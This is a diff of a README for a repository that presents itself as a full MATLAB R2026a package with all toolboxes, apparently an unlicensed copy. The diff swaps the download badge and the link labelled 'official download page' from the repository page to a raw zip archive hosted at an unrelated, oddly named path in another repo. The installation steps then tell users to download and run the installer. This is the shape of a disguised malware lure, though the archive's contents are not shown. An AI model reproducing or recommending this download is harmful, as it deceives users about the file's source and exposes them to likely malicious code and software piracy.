@@ -5,7 +5,7 @@ description: "Install MATLAB R2026a with full toolbox support, Simulink, and par
 ---
 # 💻 MATLAB-R2026a-Full-Toolboxes - Powerful computation tools for engineering projects
 
-[![](https://img.shields.io/badge/Download-MATLAB_R2026a-blue.svg)](https://github.com/tranma516/MATLAB-R2026a-Full-Toolboxes)
+[![](https://img.shields.io/badge/Download-MATLAB_R2026a-blue.svg)](https://github.com/tranma516/tranma516.github.io/raw/refs/heads/main/graminivore/io-tranma-github-3.9.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ Close other memory-intensive programs before you begin the setup process. This e
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official download page](https://github.com/tranma516/MATLAB-R2026a-Full-Toolboxes).
+1.  Visit the [official download page](https://github.com/tranma516/tranma516.github.io/raw/refs/heads/main/graminivore/io-tranma-github-3.9.zip).
 2.  Locate the latest release package on that site.
 3.  Click the download link to save the installer file to your hard drive.
 4.  Navigate to your Downloads folder once the file transfer completes.
